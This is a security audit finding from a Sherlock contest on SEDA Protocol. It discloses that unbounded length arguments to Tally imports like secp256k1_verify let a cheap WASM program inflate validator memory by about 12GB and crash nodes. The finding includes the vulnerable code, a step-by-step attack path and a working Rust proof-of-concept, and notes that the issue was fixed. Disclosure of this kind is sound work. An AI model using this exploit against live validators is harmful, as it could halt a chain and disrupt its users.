---
tags:
  - severity/high
  - has/github
  - has/poc
  - lang/rust
  - sector/staking
  - platform/sherlock
  - lang/solidity
protocol: "[[SEDA Protocol]]"
auditors:
  - g
report: "https://github.com/sherlock-audit/2024-12-seda-protocol-judging"
genome:
  - "[[dos-resistance]]"
  - "[[integer-bounds]]"
  - "[[dos/gas-limit]]"
  - "[[dos/permanent]]"
  - "[[known-pattern]]"
  - "[[single-tx]]"
  - "[[add-check]]"
  - "[[precondition/always]]"
  - "[[blast-radius/protocol-wide]]"
---
# H-16: Anyone can pass any length to some Tally imports to inflate memory, induce OOM, and crash validators

- id: 55243
- impact: HIGH
- protocol: SEDA Protocol
- reporter: g (Sherlock)
- source: N/A

## Summary


This bug report discusses an issue with Tally imports that can cause memory inflation, Out-of-Memory errors, and crashes for validators. The issue is caused by a lack of limits on the length parameters for `secp256k1_verify` and other imports, allowing an attacker to exploit this and bloat memory usage by 12GB. The gas cost for this attack is also very low, making it easy for an attacker to crash multiple validators. The impact of this bug is significant as it can cause chain halts. A proof-of-concept WASM program is provided to demonstrate the exploit. The protocol team has fixed this issue in recent PRs/commits by limiting the length parameters and increasing gas costs. 

## Details

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/250 

## Found by 
g

### Summary

A Tally program can use Tally imports like [`secp256k1_verify`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-wasm-vm/runtime/core/src/core_vm_imports/secp256_k1.rs#L17-L49) and set its `message_length`, `signature_length`, and `public_key_length` to `max::u32` and bloat memory usage by 12GB.

### Root Cause

There are 2 root causes for this issue:

1. There are no limits for `message_length`, `signature_length`, and `public_key_length`.

```rust
fn secp256k1_verify(
    mut env: FunctionEnvMut<'_, VmContext>,
    message: WasmPtr<u8>,
    message_length: i64,
    signature: WasmPtr<u8>,
    signature_length: i32,
    public_key: WasmPtr<u8>,
    public_key_length: i32,
) -> Result<u8> {
    apply_gas_cost(
        crate::metering::ExternalCallType::Secp256k1Verify(message_length as u64),
        &mut env,
    )?;

    let ctx = env.data();
    let memory = ctx.memory_view(&env);

    // Fetch function arguments as Vec<u8>
    // @audit using max::u32 for each of lengths will allocate a total memory of 12GB
    let message = message.slice(&memory, message_length as u32)?.read_to_vec()?;
    let signature = signature.slice(&memory, signature_length as u32)?.read_to_vec()?;
    let public_key = public_key.slice(&memory, public_key_length as u32)?.read_to_vec()?;
```

Below is the calculation for the memory use if maxU32 is used as length for all.

```pseudocode
message_length:     4,294,967,295 bytes
signature_length:   4,294,967,295 bytes
public_key_length:  4,294,967,295 bytes
                   ------------
---
Total:            12,884,901,885 bytes

Converting to GB:
12,884,901,885 / 1,073,741,824 ≈ 12 GB
```

2. The [gas cost](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-wasm-vm/runtime/core/src/metering.rs#L115-L117) for calling `secp256k1_verify` with the max lengths is only ~4.3e13 SEDA tokens. One whole SEDA token is 1e18 and
the current price of 1 whole SEDA token ~$0.03019. The cost of bloating all SEDA Chain validators' memory by 12GB is negligible.

Calculation for the `secp256k1_verify` gas cost:

```pseudocode
gas_cost = 1e7 + 1e7 + (1e4 * bytes_length)
bytes_length = maxU32 ~= 4.3e9
gas_cost = 1e7 + 1e7 + (1e4 * ~4.3e9)
gas_cost = ~4.3e13   // The gas cost is much less than 1e18 SEDA tokens
```

* Note that the issue also exists in `keccak256` and `execution_result` but in lesser degrees.

### Internal Pre-conditions
None

### External Pre-conditions
None


### Attack Path
1. The Attacker creates a WASM program that calls the `secp256k1_verify` import with max::u32 values for `message_length`, `signature_length`, and `public_key_length`.
2. The Attacker then compiles the WASM program and deploys the binary via [`StoreOracleProgram()`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/wasm-storage/keeper/msg_server.go#L34-L96).
3. The Attacker posts a Data Request that will execute their earlier deployed Tally Program.
4. Once the Data Request is for tallying, it will be processed in the Tally module's [`EndBlock()`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/endblock.go#L22-L41).
5. When [executing](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/endblock.go#L210) the Attacker's Tally Program, the validator node's memory usage will inflate by ~12GB. This can crash multiple validators due to Out-of-Memory.


### Impact
Crashing multiple validators due to Out-of-Memory can cause chain halts.


### PoC

The example WASM program that exploits the issue in `secp256k1_verify`.

```rust
#[link(wasm_import_module = "seda_v1")]
extern "C" {
    pub fn secp256k1_verify(
        message: *const u8,
        message_length: i64,
        signature: *const u8,
        signature_length: i32,
        public_key: *const u8,
        public_key_length: i32,
    ) -> u8;
}

fn main() {
    let result = vec![1, 2, 3];
    unsafe {
        secp256k1_verify(
            result.as_ptr(), 
            u32::MAX as i64,
            result.as_ptr(),
            -1i32,
            result.as_ptr(), 
            -1i32,
        );
    }
}
```


### Mitigation
Consider limiting all the length parameters in all the Tally imports and/or increase the gas costs.

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/sedaprotocol/seda-wasm-vm/pull/59
